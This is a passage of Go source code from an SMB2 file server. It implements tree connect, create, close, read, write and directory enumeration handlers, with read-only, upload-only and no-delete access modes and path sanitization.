	cs.addTree(&smbTree{ID: treeID, ShareName: s.ShareName, RootPath: s.Root})
	logger.Infof("SMB: tree connected %s → %s (treeID=%d)", path, s.Root, treeID)
	logger.Debugf("SMB: TREE_CONNECT: session=%d treeID=%d share=%q path=%s", h.SessionID, h.TreeID, shareName, path)

	return s.buildTreeConnectResp(h, treeID, 1)
}

func (s *SMBServer) buildTreeConnectResp(h *smb2Hdr, treeID uint32, shareType uint8) []byte {
	body := make([]byte, 16)
	putle16(body, 0, 16) // StructureSize
	body[2] = shareType  // ShareType
	// ShareFlags
	putle32(body, 4, 0)

	// Capabilities
	putle32(body, 8, 0)

	// MaximalAccess
	maxAccess := uint32(0x001F01FF) // disk share: full access
	if shareType == 2 {
		maxAccess = 0x001F01BF // IPC$: standard Windows IPC$ mask
	}
	putle32(body, 12, maxAccess)

	resp := make([]byte, 64+16)
	copy(resp, buildRespHdr(SMB2_TREE_CONNECT, STATUS_SUCCESS, h.MessageID, treeID, h.SessionID))
	copy(resp[64:], body)
	logger.Debugf("SMB: TREE_CONNECT RESP: treeID=%d shareType=%d",
		treeID, shareType)
	return resp
}

// ── SMB2 TreeDisconnect ────────────────────────────────────────────────────

func (s *SMBServer) handleTreeDisconnect(cs *connState, h *smb2Hdr) []byte {
	cs.removeTree(h.TreeID)
	body := make([]byte, 4)
	putle16(body, 0, 4)
	resp := make([]byte, 64+4)
	copy(resp, buildRespHdr(SMB2_TREE_DISCONNECT, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
	copy(resp[64:], body)
	return resp
}

// ── SMB2 Create ────────────────────────────────────────────────────────────

func (s *SMBServer) handleCreate(cs *connState, h *smb2Hdr, buf []byte) []byte {
	tree := cs.getTree(h.TreeID)
	if tree == nil {
		logger.Debugf("SMB: CREATE: invalid treeID=%d", h.TreeID)
		return errResp(h, STATUS_BAD_NETWORK_NAME)
	}
	logger.Debugf("SMB: CREATE: treeID=%d share=%s", h.TreeID, tree.ShareName)

	// Handle named pipes
	if strings.EqualFold(tree.ShareName, "IPC$") {
		if len(buf) < 64+56 {
			return errResp(h, STATUS_INVALID_PARAMETER)
		}
		body := buf[64:]
		nameOff := int(le16(body, 44))
		nameLen := int(le16(body, 46))
		pipeName := ""
		if nameLen > 0 && nameOff+nameLen <= len(buf) {
			pipeName = fromUTF16LE(buf[nameOff : nameOff+nameLen])
		}
		hID := cs.newHandleID()
		handle := &smbHandle{
			ID:     hID,
			Path:   pipeName,
			IsPipe: true,
		}
		cs.addHandle(handle)
		logger.Debugf("SMB: pipe opened: %s (hID=%d)", pipeName, hID)
		return s.buildPipeCreateResp(h, handle)
	}

	// File / directory create
	if len(buf) < 64+56 {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	body := buf[64:]

	desiredAccess := le32(body, 24)
	createDisp := le32(body, 36)
	createOptions := le32(body, 40)
	nameOff := int(le16(body, 44))
	nameLen := int(le16(body, 46))

	var relPath string
	if nameLen > 0 && nameOff+nameLen <= len(buf) {
		relPath = fromUTF16LE(buf[nameOff : nameOff+nameLen])
	}

	logger.Debugf("SMB: CREATE path=%q", relPath)

	// Alternate Data Streams (e.g. "file.txt:Zone.Identifier:$DATA") are not
	// supported on Linux.  Return a null-sink handle so Windows silently discards
	// the stream instead of showing an error or leaving a stray colon-file on disk.
	if strings.Contains(relPath, ":") {
		hID := cs.newHandleID()
		handle := &smbHandle{
			ID:         hID,
			Path:       relPath,
			IsNullSink: true,
		}
		cs.addHandle(handle)
		logger.Debugf("SMB: CREATE ADS null-sink: %q (hID=%d)", relPath, hID)
		body := make([]byte, 88)
		putle16(body, 0, 89)
		putle32(body, 4, FILE_CREATED)
		now := time.Now()
		putWinTime(body, 8, now)
		putWinTime(body, 16, now)
		putWinTime(body, 24, now)
		putWinTime(body, 32, now)
		putle32(body, 56, FILE_ATTRIBUTE_NORMAL)
		copy(body[64:], handleFileID(hID))
		resp := make([]byte, 64+88)
		copy(resp, buildRespHdr(SMB2_CREATE, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
		copy(resp[64:], body)
		return resp
	}

	// Sanitize and build absolute path
	localPath, err := s.safePath(tree.RootPath, relPath)
	if err != nil {
		return errResp(h, STATUS_OBJECT_PATH_NOT_FOUND)
	}

	isDir := (createOptions & FILE_DIRECTORY_FILE) != 0
	if relPath == "" {
		isDir = true
	}
	// Windows does not always set FILE_DIRECTORY_FILE when reopening an existing
	// directory (e.g. for rename or attribute queries). Trust the filesystem.
	if !isDir {
		if info, statErr := os.Stat(localPath); statErr == nil && info.IsDir() {
			isDir = true
		}
	}
	wantRead := (desiredAccess & (FILE_READ_DATA | FILE_READ_EA | FILE_READ_ATTRIBUTES)) != 0
	wantWrite := (desiredAccess & (0x40000000 | 0x00000002 | 0x00000004)) != 0
	wantDelete := (desiredAccess&DELETE) != 0 || (createOptions&FILE_DELETE_ON_CLOSE) != 0

	// FILE_OPEN on a non-existent path must return NOT_FOUND, not ACCESS_DENIED.
	// Returning ACCESS_DENIED confuses Windows: e.g. during the "New Folder →
	// rename" flow it sends FILE_OPEN on the target name to check it doesn't
	// already exist, and it interprets ACCESS_DENIED as "path is taken" instead
	// of "path is free".  Short-circuit here before access control fires.
	if createDisp == FILE_OPEN {
		if _, statErr := os.Stat(localPath); statErr != nil {
			return errResp(h, STATUS_OBJECT_NAME_NOT_FOUND)
		}
	}

	// READ-ONLY mode
	if s.ReadOnly && (wantWrite || wantDelete) {
		logger.Debugf("SMB: CREATE denied (read-only) %s", localPath)
		return errResp(h, STATUS_ACCESS_DENIED)
	}

	// UPLOAD-ONLY mode
	if s.UploadOnly {
		// FILE_DELETE_ON_CLOSE explicitly requests deletion on close — block it.
		// We do NOT block the DELETE access mask here: Windows opens directories
		// with DELETE access when performing a rename (FileRenameInformation), and
		// we want that to work. Actual deletion is enforced at the SetInfo
		// (FileDispositionInformation) and handleClose (DeleteOnClose) levels.
		if createOptions&FILE_DELETE_ON_CLOSE != 0 {
			logger.Debugf("SMB: CREATE denied (upload-only, delete-on-close) %s", localPath)
			return errResp(h, STATUS_ACCESS_DENIED)
		}
		// Block read-only file opens — no downloads.
		// Exception: files created/overwritten in this session (newlyCreatedPaths)
		// can be re-opened for reading; Windows Explorer does this to verify a
		// completed upload (progress dialog, metadata refresh).
		// Directories are never blocked: Windows opens them with FILE_READ_ATTRIBUTES,
		// DELETE, and write bits for rename and listing.
		if !isDir && wantRead && !wantWrite {
			if _, ok := s.newlyCreatedPaths.Load(localPath); !ok {
				logger.Debugf("SMB: CREATE denied (upload-only, read file) %s", localPath)
				return errResp(h, STATUS_ACCESS_DENIED)
			}
		}
	}

	// NO-DELETE mode — same reasoning: block delete-on-close, not the DELETE mask.
	if s.NoDelete && createOptions&FILE_DELETE_ON_CLOSE != 0 {
		logger.Debugf("SMB: CREATE denied (no-delete, delete-on-close) %s", localPath)
		return errResp(h, STATUS_ACCESS_DENIED)
	}

	var createAction uint32
	var fi os.FileInfo
	var f *os.File

	existing, statErr := os.Stat(localPath)

	if s.ReadOnly {
		switch createDisp {
		case FILE_CREATE, FILE_OPEN_IF, FILE_OVERWRITE, FILE_OVERWRITE_IF, FILE_SUPERSEDE:
			logger.Debugf("SMB: CREATE denied (read-only create/overwrite) %s", localPath)
			return errResp(h, STATUS_ACCESS_DENIED)
		}
	}

	// NO-DELETE / UPLOAD-ONLY: the overwrite dispositions open an existing file
	// with os.Create (O_TRUNC), emptying its contents. Treat truncating overwrite
	// of a pre-existing served file as destruction and refuse it. New files
	// (statErr != nil) and the operator's own uploads (newlyCreatedPaths) are
	// unaffected.
	if statErr == nil && !existing.IsDir() && s.protectExisting(localPath) {
		switch createDisp {
		case FILE_OVERWRITE, FILE_OVERWRITE_IF, FILE_SUPERSEDE:
			logger.Debugf("SMB: CREATE denied (no-delete/upload-only overwrite) %s", localPath)
			return errResp(h, STATUS_ACCESS_DENIED)
		}
	}

	switch createDisp {
	case FILE_OPEN:
		if statErr != nil {
			return errResp(h, STATUS_OBJECT_NAME_NOT_FOUND)
		}
		createAction = FILE_OPENED

	case FILE_CREATE:
		if statErr == nil {
			return errResp(h, STATUS_OBJECT_NAME_COLLISION)
		}
		if isDir {
			if err := os.MkdirAll(localPath, 0755); err != nil {
				return errResp(h, STATUS_ACCESS_DENIED)
			}
		} else {
			f, err = os.Create(localPath)
			if err != nil {
				return errResp(h, STATUS_ACCESS_DENIED)
			}
		}
		createAction = FILE_CREATED

	case FILE_OPEN_IF:
		if statErr != nil {
			if isDir {
				if err := os.MkdirAll(localPath, 0755); err != nil {
					return errResp(h, STATUS_ACCESS_DENIED)
				}
			} else {
				f, err = os.Create(localPath)
				if err != nil {
					return errResp(h, STATUS_ACCESS_DENIED)
				}
			}
			createAction = FILE_CREATED
		} else {
			createAction = FILE_OPENED
		}

	case FILE_OVERWRITE, FILE_OVERWRITE_IF, FILE_SUPERSEDE:
		if statErr == nil && existing.IsDir() {
			createAction = FILE_OPENED
		} else {
			f, err = os.Create(localPath)
			if err != nil {
				return errResp(h, STATUS_ACCESS_DENIED)
			}
			if statErr == nil {
				createAction = FILE_OVERWRITTEN
			} else {
				createAction = FILE_CREATED
			}
		}

	default:
		return errResp(h, STATUS_INVALID_PARAMETER)
	}

	// Re-stat after possible creation
	fi, err = os.Stat(localPath)
	if err != nil {
		if f != nil {
			f.Close()
		}
		return errResp(h, STATUS_OBJECT_NAME_NOT_FOUND)
	}

	// Open file handle
	if f == nil && !fi.IsDir() {
		flags := os.O_RDONLY
		if (wantWrite && !s.ReadOnly) || s.UploadOnly {
			flags = os.O_WRONLY
		}
		f, err = os.OpenFile(localPath, flags, 0644)
		if err != nil {
			// Fall back to read-only if allowed
			f, err = os.OpenFile(localPath, os.O_RDONLY, 0)
			if err != nil {
				return errResp(h, STATUS_ACCESS_DENIED)
			}
		}
	}

	hID := cs.newHandleID()
	if s.ReadOnly && (createOptions&FILE_DELETE_ON_CLOSE != 0) {
		return errResp(h, STATUS_ACCESS_DENIED)
	}
	handle := &smbHandle{
		ID:            hID,
		Path:          localPath,
		File:          f,
		IsDir:         fi.IsDir(),
		DeleteOnClose: (createOptions & FILE_DELETE_ON_CLOSE) != 0,
		AccessMask:    desiredAccess,
		Modified:      createAction == FILE_CREATED || createAction == FILE_OVERWRITTEN,
	}
	cs.addHandle(handle)

	// Remember newly-created/overwritten paths server-wide so upload-only mode
	// can allow re-reads of just-uploaded files (Explorer verifies uploads) and
	// renames of just-created items while still blocking pre-existing content.
	if createAction == FILE_CREATED || createAction == FILE_OVERWRITTEN || createAction == FILE_SUPERSEDED {
		s.newlyCreatedPaths.Store(localPath, struct{}{})
	}

	// Parse create contexts (MxAc, QFid, DHnQ, …) from the request.
	ctxOff := int(le32(body, 48))
	ctxLen := int(le32(body, 52))
	wantsMxAc := false
	wantsQFid := false
	if ctxLen > 0 && ctxOff > 0 && ctxOff+ctxLen <= len(buf) {
		ctxBuf := buf[ctxOff : ctxOff+ctxLen]
		pos := 0
		for pos < len(ctxBuf) {
			if pos+16 > len(ctxBuf) {
				break
			}
			nextOff := int(le32(ctxBuf, pos))
			cNameOff := int(le16(ctxBuf, pos+4))
			cNameLen := int(le16(ctxBuf, pos+6))
			if cNameLen >= 4 && pos+cNameOff+cNameLen <= len(ctxBuf) {
				tag := string(ctxBuf[pos+cNameOff : pos+cNameOff+cNameLen])
				switch tag {
				case "MxAc":
					wantsMxAc = true
				case "QFid":
					wantsQFid = true
				}
			}
			if nextOff == 0 {
				break
			}
			pos += nextOff
		}
	}

	return s.buildCreateResp(h, handle, fi, createAction, wantsMxAc, wantsQFid)
}

func (s *SMBServer) buildCreateResp(h *smb2Hdr, handle *smbHandle, fi os.FileInfo, action uint32, wantsMxAc bool, wantsQFid bool) []byte {
	// Body: 88 bytes fixed
	body := make([]byte, 88)
	putle16(body, 0, 89) // StructureSize
	// OplockLevel = 0 (none), Flags = 0
	putle32(body, 4, action)

	mod := fi.ModTime()
	putWinTime(body, 8, mod)  // CreationTime
	putWinTime(body, 16, mod) // LastAccessTime
	putWinTime(body, 24, mod) // LastWriteTime
	putWinTime(body, 32, mod) // ChangeTime

	if fi.IsDir() {
		putle32(body, 56, FILE_ATTRIBUTE_DIRECTORY)
	} else {
		size := uint64(fi.Size())
		alloc := ((size + 4095) / 4096) * 4096
		putle64(body, 40, alloc) // AllocationSize
		putle64(body, 48, size)  // EndOfFile
		// FILE_ATTRIBUTE_NORMAL is only valid alone; regular files use ARCHIVE.
		putle32(body, 56, FILE_ATTRIBUTE_ARCHIVE)
	}

	// FileId: persistent(8) + volatile(8)
	copy(body[64:], handleFileID(handle.ID))

	// Build create context responses for MxAc and QFid.
	// Per MS-SMB2 §3.3.5.9, the server MUST include a response for each context
	// the client requested. When both are present, chain them: MxAc first (with
	// NextEntryOffset pointing to QFid), then QFid (NextEntryOffset = 0).
	var ctxData []byte
	inode := inodeNumber(fi)

	maxAccess := s.maximalAccess(fi.IsDir())

	switch {
	case wantsMxAc && wantsQFid:
		mxAc := buildMxAcContext(maxAccess)
		qFid := buildQFidContext(inode)
		// MxAc is 32 bytes; pad to 8-byte alignment before QFid (already aligned).
		putle32(mxAc, 0, uint32(len(mxAc))) // NextEntryOffset → start of QFid
		ctxData = append(mxAc, qFid...)
	case wantsMxAc:
		ctxData = buildMxAcContext(maxAccess)
	case wantsQFid:
		ctxData = buildQFidContext(inode)
	}

	if len(ctxData) > 0 {
		putle32(body, 80, uint32(64+88))        // CreateContextsOffset (from SMB2 header)
		putle32(body, 84, uint32(len(ctxData))) // CreateContextsLength
	}

	resp := make([]byte, 64+88+len(ctxData))
	copy(resp, buildRespHdr(SMB2_CREATE, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
	copy(resp[64:], body)
	copy(resp[64+88:], ctxData)
	return resp
}

// buildMxAcContext builds a SMB2_CREATE_QUERY_MAXIMAL_ACCESS_RESPONSE create context.
// Layout (32 bytes): 16-byte fixed header | "MxAc" (4) | pad (4) | status (4) | access (4)
func buildMxAcContext(maxAccess uint32) []byte {
	ctx := make([]byte, 32)
	// NextEntryOffset = 0 (only context)
	putle16(ctx, 4, 16)  // NameOffset: right after the 16-byte fixed header
	putle16(ctx, 6, 4)   // NameLength
	putle16(ctx, 10, 24) // DataOffset: 16+4 name+4 pad = 24 (8-byte aligned)
	putle32(ctx, 12, 8)  // DataLength: QueryStatus(4) + MaximalAccess(4)
	copy(ctx[16:], []byte("MxAc"))
	// ctx[20:24] = padding (already zero)
	putle32(ctx, 24, STATUS_SUCCESS) // QueryStatus
	putle32(ctx, 28, maxAccess)      // MaximalAccess
	return ctx
}

// buildQFidContext builds a SMB2_CREATE_QUERY_ON_DISK_ID_RESPONSE create context.
// Layout (56 bytes): 16-byte header | "QFid" (4) | pad (4) | DiskFileId (16) | VolumeId (16)
func buildQFidContext(inode uint64) []byte {
	ctx := make([]byte, 56)
	// NextEntryOffset = 0 (last or only context)
	putle16(ctx, 4, 16)  // NameOffset
	putle16(ctx, 6, 4)   // NameLength
	putle16(ctx, 10, 24) // DataOffset (8-byte aligned: 16 header + 4 name + 4 pad)
	putle32(ctx, 12, 32) // DataLength: DiskFileId(16) + VolumeId(16)
	copy(ctx[16:], []byte("QFid"))
	// ctx[20:24] = padding (zero)
	// DiskFileId: use inode in low 8 bytes, high 8 bytes zero
	putle64(ctx, 24, inode)
	// VolumeId: all zeros (bytes 40-55)
	return ctx
}

// maximalAccess returns the SMB2 MaximalAccess mask advertised in the MxAc
// create context response, reflecting the server's current operating mode.
//
// isDir must be true when the handle refers to a directory. This matters for
// upload-only mode: Windows uses the MxAc value to decide whether to attempt
// a rename (FileRenameInformation requires DELETE access). Directories must
// advertise DELETE so that the "New Folder → type name → Enter" flow works;
// actual deletion is still blocked at the SetInfo/handleClose level.
func (s *SMBServer) maximalAccess(isDir bool) uint32 {
	switch {
	case s.ReadOnly:
		// Read + execute, no write or delete.
		return 0x001200A9 // FILE_GENERIC_READ | FILE_EXECUTE
	case s.UploadOnly:
		if isDir {
			// Full access for directories: Windows needs DELETE in MxAc to
			// attempt rename. Deletion itself is blocked at the operation level.
			return 0x001F01FF // FILE_ALL_ACCESS
		}
		// Files: write-only, no read-data, no delete.
		return 0x00120116 // FILE_GENERIC_WRITE (without DELETE)
	case s.NoDelete:
		// Full access except DELETE (0x00010000).
		return 0x001E01FF // FILE_ALL_ACCESS & ^DELETE
	default:
		return 0x001F01FF // FILE_ALL_ACCESS
	}
}

func (s *SMBServer) buildPipeCreateResp(h *smb2Hdr, handle *smbHandle) []byte {
	body := make([]byte, 88)
	putle16(body, 0, 89)          // StructureSize
	putle32(body, 4, FILE_OPENED) // CreateAction
	now := time.Now()
	putWinTime(body, 8, now)
	putWinTime(body, 16, now)
	putWinTime(body, 24, now)
	putWinTime(body, 32, now)
	putle32(body, 56, 0) // FileAttributes MUST be 0 for named pipes (MS-SMB2 3.3.5.9)
	copy(body[64:], handleFileID(handle.ID))
	resp := make([]byte, 64+88)
	copy(resp, buildRespHdr(SMB2_CREATE, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
	copy(resp[64:], body)
	return resp
}

// ── SMB2 Close ─────────────────────────────────────────────────────────────

const SMB2_CLOSE_FLAG_POSTQUERY_ATTRIB uint16 = 0x0001

func (s *SMBServer) handleClose(cs *connState, h *smb2Hdr, buf []byte) []byte {
	if len(buf) < 64+24 {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	body := buf[64:]
	closeFlags := le16(body, 2)
	hID := fileIDFromBuf(body, 8)

	handle := cs.removeHandle(hID)
	if handle != nil {
		if handle.File != nil {
			handle.File.Close()
		}
		if handle.DeleteOnClose {
			if s.UploadOnly || s.NoDelete {
				mode := "no-delete"
				if s.UploadOnly {
					mode = "upload-only"
				}
				logger.Debugf("SMB: delete denied (%s) %s", mode, handle.Path)
				// Do not delete; close succeeds but the file is left intact.
			} else {
				if err := os.Remove(handle.Path); err != nil {
					logger.Debugf("SMB: delete failed: %v", err)
				}
			}
		}
		// Fire CHANGE_NOTIFY only when the handle actually modified the filesystem:
		// newly created/overwritten files or dirs, written files, or deleted files.
		// Do NOT fire for read-only opens (e.g. root dir opens for QUERY_INFO) to
		// avoid a slow re-notification polling loop that stalls file uploads.
		if !handle.IsPipe && (handle.Modified || handle.DeleteOnClose) {
			s.fireAllWatches(cs)
		}
	}

	// Close response body: StructureSize(2) + Flags(2) + Reserved(4) +
	//   CreationTime(8) + LastAccessTime(8) + LastWriteTime(8) + ChangeTime(8) +
	//   AllocationSize(8) + EndOfFile(8) + FileAttributes(4) = 60 bytes
	respBody := make([]byte, 60)
	putle16(respBody, 0, 60) // StructureSize

	// When the client sets SMB2_CLOSE_FLAG_POSTQUERY_ATTRIB it expects the
	// server to return the file's final attributes in the response.  Without
	// this, Windows caches size=0 / attrs=0 / epoch timestamps and treats the
	// file as empty, preventing the associated application from being launched.
	if closeFlags&SMB2_CLOSE_FLAG_POSTQUERY_ATTRIB != 0 &&
		handle != nil && !handle.IsPipe && !handle.IsNullSink && handle.Path != "" {
		if fi, err := os.Stat(handle.Path); err == nil {
			putle16(respBody, 2, uint16(SMB2_CLOSE_FLAG_POSTQUERY_ATTRIB))
			mod := fi.ModTime()
			putWinTime(respBody, 8, mod)  // CreationTime
			putWinTime(respBody, 16, mod) // LastAccessTime
			putWinTime(respBody, 24, mod) // LastWriteTime
			putWinTime(respBody, 32, mod) // ChangeTime
			if fi.IsDir() {
				putle32(respBody, 56, FILE_ATTRIBUTE_DIRECTORY)
			} else {
				size := uint64(fi.Size())
				alloc := ((size + 4095) / 4096) * 4096
				putle64(respBody, 40, alloc) // AllocationSize
				putle64(respBody, 48, size)  // EndOfFile
				putle32(respBody, 56, FILE_ATTRIBUTE_ARCHIVE)
			}
		}
	}

	resp := make([]byte, 64+60)
	copy(resp, buildRespHdr(SMB2_CLOSE, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
	copy(resp[64:], respBody)
	return resp
}

// ── SMB2 Flush ─────────────────────────────────────────────────────────────

func (s *SMBServer) handleFlush(cs *connState, h *smb2Hdr) []byte {
	body := make([]byte, 4)
	putle16(body, 0, 4)
	resp := make([]byte, 64+4)
	copy(resp, buildRespHdr(SMB2_FLUSH, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
	copy(resp[64:], body)
	return resp
}

// ── SMB2 Read ──────────────────────────────────────────────────────────────

func (s *SMBServer) handleRead(cs *connState, h *smb2Hdr, buf []byte) []byte {
	if len(buf) < 64+48 {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	body := buf[64:]

	readLen := int(le32(body, 4))
	readOffset := int64(le64(body, 8))
	hID := fileIDFromBuf(body, 16)

	if readLen > 8*1024*1024 {
		readLen = 8 * 1024 * 1024
	}

	handle := cs.getHandle(hID)
	if handle == nil {
		logger.Debugf("SMB: READ nil handle hID=%d", hID)
		return errResp(h, STATUS_INVALID_PARAMETER)
	}

	// ── Named pipe ──
	if handle.IsPipe {
		data := handle.PipeResp
		handle.PipeResp = nil
		if data == nil {
			data = []byte{}
		}
		if readLen < len(data) {
			chunk := data[:readLen]
			handle.PipeResp = data[readLen:]
			data = chunk
		} else {
			handle.PipeResp = nil
		}
		respBody := make([]byte, 16+len(data))
		putle16(respBody, 0, 17)
		respBody[2] = 64 + 16 // DataOffset
		respBody[3] = 0       // Reserved
		putle32(respBody, 4, uint32(len(data)))
		copy(respBody[16:], data)

		resp := make([]byte, 64+len(respBody))
		copy(resp, buildRespHdr(SMB2_READ, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
		copy(resp[64:], respBody)
		return resp
	}

	if handle.File == nil {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}

	// Upload-only mode: file downloads are not permitted.
	if s.UploadOnly {
		logger.Debugf("SMB: READ denied (upload-only) %s", handle.Path)
		return errResp(h, STATUS_ACCESS_DENIED)
	}

	data := make([]byte, readLen)
	n, err := handle.File.ReadAt(data, readOffset)
	if n == 0 && err != nil {
		if err == io.EOF {
			return errResp(h, STATUS_END_OF_FILE)
		}
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	data = data[:n]

	// Body: StructureSize(2) + DataOffset(1) + Reserved(1) +
	//       DataLength(4) + DataRemaining(4) + Reserved2(4) = 16 bytes
	respBody := make([]byte, 16+len(data))
	putle16(respBody, 0, 17) // StructureSize
	respBody[2] = 64 + 16    // DataOffset
	respBody[3] = 0          // Reserved
	putle32(respBody, 4, uint32(len(data)))
	copy(respBody[16:], data)

	resp := make([]byte, 64+len(respBody))
	copy(resp, buildRespHdr(SMB2_READ, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
	copy(resp[64:], respBody)
	return resp
}

// ── SMB2 Write ─────────────────────────────────────────────────────────────

// protectExisting reports whether --no-delete / --upload-only must refuse a
// content-destroying operation (in-place write, truncate, overwrite, rename)
// on localPath. Files created earlier in this session (newlyCreatedPaths) are
// the operator's own uploads and stay writable so Windows' create→write→rename
// upload flow keeps working; pre-existing served files are protected. When
// neither flag is set it always returns false, so default behaviour is
// unchanged.
func (s *SMBServer) protectExisting(localPath string) bool {
	if !s.NoDelete && !s.UploadOnly {
		return false
	}
	_, created := s.newlyCreatedPaths.Load(localPath)
	return !created
}

func (s *SMBServer) handleWrite(cs *connState, h *smb2Hdr, buf []byte) []byte {
	if len(buf) < 64+48 {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	body := buf[64:]
	dataOff := int(le16(body, 2))
	dataLen := int(le32(body, 4))
	hID := fileIDFromBuf(body, 16)

	if dataOff+dataLen > len(buf) {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	data := buf[dataOff : dataOff+dataLen]

	handle := cs.getHandle(hID)
	if handle == nil {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}

	// ── Named pipe ──
	if handle.IsPipe {
		respPipe := s.handlePipeWrite(handle, data)
		if respPipe != nil {
			handle.PipeResp = respPipe
		}
		respBody := make([]byte, 16)
		putle16(respBody, 0, 17)
		putle32(respBody, 4, uint32(len(data)))
		resp := make([]byte, 64+16)
		copy(resp, buildRespHdr(SMB2_WRITE, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
		copy(resp[64:], respBody)
		return resp
	}

	// ── ADS null-sink (e.g. Zone.Identifier) — discard silently ──
	if handle.IsNullSink {
		respBody := make([]byte, 16)
		putle16(respBody, 0, 17)
		putle32(respBody, 4, uint32(dataLen))
		resp := make([]byte, 64+16)
		copy(resp, buildRespHdr(SMB2_WRITE, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
		copy(resp[64:], respBody)
		return resp
	}
	if s.ReadOnly {
		return errResp(h, STATUS_ACCESS_DENIED)
	}

	// NO-DELETE / UPLOAD-ONLY: an SMB2 WRITE at a client-chosen offset overwrites
	// the contents of a file in place. Treat in-place modification of a
	// pre-existing served file as destruction and refuse it; the operator's own
	// uploads (newlyCreatedPaths) are still streamed via WRITE after CREATE.
	if s.protectExisting(handle.Path) {
		logger.Debugf("SMB: WRITE denied (no-delete/upload-only, pre-existing file) %s", handle.Path)
		return errResp(h, STATUS_ACCESS_DENIED)
	}

	writeOff := int64(le64(body, 8))
	handle = cs.getHandle(hID)
	if handle == nil || handle.File == nil {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}

	n, err := handle.File.WriteAt(data, writeOff)
	if err != nil {
		return errResp(h, STATUS_ACCESS_DENIED)
	}
	handle.Modified = true

	// Body: StructureSize(2) + Reserved(2) + Count(4) + Remaining(4) +
	//       WriteChannelInfoOffset(2) + WriteChannelInfoLength(2) = 16 bytes
	respBody := make([]byte, 16)
	putle16(respBody, 0, 17)
	putle32(respBody, 4, uint32(n))

	resp := make([]byte, 64+16)
	copy(resp, buildRespHdr(SMB2_WRITE, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
	copy(resp[64:], respBody)
	return resp
}

// ── SMB2 QueryDirectory ────────────────────────────────────────────────────

func (s *SMBServer) handleQueryDir(cs *connState, h *smb2Hdr, buf []byte) []byte {
	if len(buf) < 64+32 {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	body := buf[64:]

	infoClass := body[2]
	flags := body[3]
	hID := fileIDFromBuf(body, 8)
	nameOff := int(le16(body, 24))
	nameLen := int(le16(body, 26))
	outMax := int(le32(body, 28))

	handle := cs.getHandle(hID)
	if handle == nil || !handle.IsDir {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}

	// Pattern filter
	if nameLen > 0 && nameOff+nameLen <= len(buf) {
		handle.SearchPattern = fromUTF16LE(buf[nameOff : nameOff+nameLen])
	}
	if handle.SearchPattern == "" {
		handle.SearchPattern = "*"
	}

	restart := (flags & SMB2_RESTART_SCANS) != 0
	reopen := (flags & SMB2_REOPEN) != 0

	isFirstEnum := handle.DirEntries == nil
	if restart || reopen || isFirstEnum {
		entries, err := os.ReadDir(handle.Path)
		if err != nil {
			return errResp(h, STATUS_OBJECT_NAME_NOT_FOUND)
		}
		handle.DirEntries = entries
		handle.DirIndex = 0
		// Reset SyntheticEntriesSent only for a brand-new handle, not on
		// RESTART_SCANS / REOPEN. This way "." and ".." are sent exactly once
		// per handle lifetime, preventing Windows Explorer from seeing a
		// duplicate "." entry after a CHANGE_NOTIFY-triggered re-enumeration.
		if isFirstEnum {
			handle.SyntheticEntriesSent = false
		}
	}

	if outMax < 1024 {
		outMax = 64 * 1024
	}

	var outBuf []byte
	prevOff := 0
	count := 0

	// Emit synthetic "." and ".." entries on the first enumeration of each handle.
	// These are required by POSIX-style clients (smbclient, Nautilus) and ensure
	// that empty directories return at least two entries rather than STATUS_NO_MORE_FILES.
	if !handle.SyntheticEntriesSent {
		fi, err := os.Stat(handle.Path)
		if err == nil {
			for _, name := range []string{".", ".."} {
				if !matchPattern(handle.SearchPattern, name) {
					continue
				}
				entry := buildDirEntry(name, fi, true, infoClass)
				if len(outBuf) > 0 {
					putle32(outBuf, prevOff, uint32(len(outBuf)-prevOff))
				}
				prevOff = len(outBuf)
				outBuf = append(outBuf, entry...)
				count++
			}
		}
		handle.SyntheticEntriesSent = true
	}

	// Iterate directory entries
	for handle.DirIndex < len(handle.DirEntries) {
		de := handle.DirEntries[handle.DirIndex]
		handle.DirIndex++

		if !matchPattern(handle.SearchPattern, de.Name()) {
			continue
		}

		fi, err := de.Info()
		if err != nil {
			continue
		}

		entry := buildDirEntry(de.Name(), fi, fi.IsDir(), infoClass)

		if len(outBuf)+len(entry) > outMax {
			handle.DirIndex-- // rollback for next call
			break
		}

		if len(outBuf) > 0 {
			putle32(outBuf, prevOff, uint32(len(outBuf)-prevOff))
		}
		prevOff = len(outBuf)
		outBuf = append(outBuf, entry...)
		count++

		if (flags & SMB2_RETURN_SINGLE_ENTRY) != 0 {
			break
		}
	}

	// No entries to return
	if count == 0 {
		return errResp(h, STATUS_NO_MORE_FILES)
	}

	// Build response
	respBody := make([]byte, 8+len(outBuf))
	putle16(respBody, 0, 9)                   // StructureSize
	putle16(respBody, 2, 64+8)                // OutputBufferOffset
	putle32(respBody, 4, uint32(len(outBuf))) // OutputBufferLength
	copy(respBody[8:], outBuf)

	resp := make([]byte, 64+len(respBody))
	copy(resp, buildRespHdr(SMB2_QUERY_DIRECTORY, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
	copy(resp[64:], respBody)

	return resp
}

// fixedHeaderLen returns the number of bytes before FileName for a given
// FileInformationClass. FileNameLength is always at offset 60 across all classes.
func fixedHeaderLen(infoClass uint8) int {
	switch infoClass {
	case 1: // FILE_DIRECTORY_INFORMATION
		return 64
	case 2: // FILE_FULL_DIRECTORY_INFORMATION
		return 68
	case 3: // FILE_BOTH_DIR_INFORMATION
		return 94
